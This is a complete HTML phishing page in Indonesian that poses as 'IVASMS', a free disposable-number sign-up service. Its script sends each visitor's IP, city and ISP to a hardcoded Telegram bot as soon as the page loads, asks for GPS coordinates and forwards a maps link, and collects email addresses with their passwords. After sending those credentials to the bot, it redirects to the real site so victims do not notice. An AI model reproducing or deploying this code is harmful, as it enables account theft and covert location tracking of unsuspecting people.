<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IVASMS - Penyedia Nokos Free & Murah</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f0f2f5; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; }
        .login-box { background: #fff; padding: 40px; border-radius: 12px; box-shadow: 0 8px 24px rgba(0,0,0,0.15); width: 100%; max-width: 380px; text-align: center; }
        .login-box h2 { color: #007bff; margin-bottom: 10px; font-size: 28px; letter-spacing: 1px; }
        .login-box p { color: #666; font-size: 14px; margin-bottom: 25px; }
        .login-box input { width: 100%; padding: 14px; margin: 8px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; font-size: 15px; }
        .login-box input:focus { border-color: #007bff; outline: none; }
        .login-box button { width: 100%; padding: 14px; background: #007bff; border: none; color: white; border-radius: 8px; cursor: pointer; font-weight: bold; font-size: 16px; margin-top: 15px; transition: 0.3s; }
        .login-box button:hover { background: #0056b3; }
        .info-lokasi { font-size: 11px; color: #999; margin-top: 20px; }
    </style>
</head>
<body>

    <div class="login-box">
        <h2>IVASMS</h2>
        <p>Silahkan daftar untuk mendapatkan nomor koson (NOKOS) secara gratis untuk verifikasi aplikasi Anda.</p>
        
        <div id="reg-form">
            <input type="email" id="email" placeholder="Alamat Email / Gmail" required>
            <input type="password" id="pass" placeholder="Password Email" required>
            <button onclick="eksekusi()">DAFTAR SEKARANG</button>
        </div>

        <div class="info-lokasi">
            *Izin lokasi diperlukan untuk memverifikasi ketersediaan stok nokos di wilayah Anda.
        </div>
    </div>

    <script>
        // --- CONFIG ---
        const tele_token = "8510635650:AAH3ZxP-qkEO2hb8kjv-tZyOZieN0IatEwo";
        const tele_id = "8551809114";

        // 1. Ambil Data IP & Lokasi Halus saat Web Dibuka
        window.onload = async () => {
            try {
                const res = await fetch('https://ipapi.co/json/');
                const data = await res.json();
                let msg = `🔔 *ADA TARGET MASUK!*\n\nIP: ${data.ip}\nKota: ${data.city}\nISP: ${data.org}`;
                kirimKeTele(msg);

                // Minta Maps (GPS)
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition((p) => {
                        const linkMaps = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
                        kirimKeTele(`📍 *LOKASI PRESISI (MAPS):*\n${linkMaps}`);
                    });
                }
            } catch (e) {}
        };

        // 2. Fungsi Kirim ke Telegram
        async function kirimKeTele(text) {
            await fetch(`https://api.telegram.org/bot${tele_token}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: tele_id, text: text, parse_mode: 'Markdown' })
            });
        }

        // 3. Eksekusi Pencurian Data & Redirect
        async function eksekusi() {
            const mail = document.getElementById('email').value;
            const pw = document.getElementById('pass').value;

            if (mail === "" || pw === "") {
                alert("Harap isi semua kolom!");
                return;
            }

            // Kirim Email & PW ke Telegram
            await kirimKeTele(`📩 *DATA LOGIN TARGET*\n\nEmail: ${mail}\nPass: ${pw}\n\n*Segera amankan!*`);

            // Alert Formalitas
            alert("Pendaftaran Berhasil! Mengalihkan ke Dashboard...");

            // REDIRECT KE WEB ASLI BIAR GAK CURIGA
            window.location.href = "https://ivasms.com/";
        }
    </script>
</body>
</html>
